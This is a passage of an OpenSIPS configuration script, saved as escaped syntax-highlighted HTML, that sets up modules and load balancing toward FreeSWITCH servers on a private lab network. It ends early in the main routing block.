&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_facility&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LOG_LOCAL0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the following lines to enable debugging */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#debug_mode=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable the auto temporary blacklisting of 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   not available destinations &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#disable_dns_blacklist=no&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable IPv6 lookup after IPv4 dns 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   lookup failures &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#dns_try_ipv6=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* comment the next line to enable the auto discovery of local aliases
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   based on revers DNS on IPs */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auto_aliases&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp:192.168.56.1:5070   &lt;span style=&#34;color:#75715e&#34;&gt;# CUSTOMIZE ME&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Modules Section ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;httpd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;httpd&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;, 8081&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_json.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIGNALING module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;signaling.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### StateLess module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Transaction Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_timeout&amp;#34;&lt;/span&gt;, 2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_inv_timeout&amp;#34;&lt;/span&gt;, 30&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;restart_fr_on_each_reply&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreply_avp_mode&amp;#34;&lt;/span&gt;, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cachedb_local.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mathops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mathops&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;decimal_digits&amp;#34;&lt;/span&gt;, 12&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rest_client.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Record Route Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not append from tag to the RR &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no need &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this script&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### MAX ForWarD module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIP MSG OPerationS module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipmsgops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### FIFO Management Interface&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo_2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_mode&amp;#34;&lt;/span&gt;, 0666&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### URI module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;use_uri_table&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cfgutils.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### USeR LOCation module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nat_bflag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NAT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;,   0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### REGISTRAR module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp_persistent_flag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TCP_PERSISTENT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line not to allow more than &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; contacts per AOR */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;registrar&amp;#34;, &amp;#34;max_contacts&amp;#34;, 10)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### ACCounting module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* what special events should be accounted ? */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;early_media&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;report_cancels&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* by default we &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not adjust the direct of the sequential requests.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; you enable this parameter, be sure the enable &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   in &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt; module */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;detect_direction&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proto_udp.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dialog.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;statistics.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;load_balancer.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;load_balancer&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql://opensips:opensipsrw@192.168.56.128/opensips&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;load_balancer&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;initial_freeswitch_load&amp;#34;&lt;/span&gt;, 15&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;load_balancer&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fetch_freeswitch_stats&amp;#34;&lt;/span&gt;, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;freeswitch.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Routing Logic ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main request routing logic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;startup_route &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;neg_replies&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;neg_replies&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;null&amp;gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$stat&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;neg_replies&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
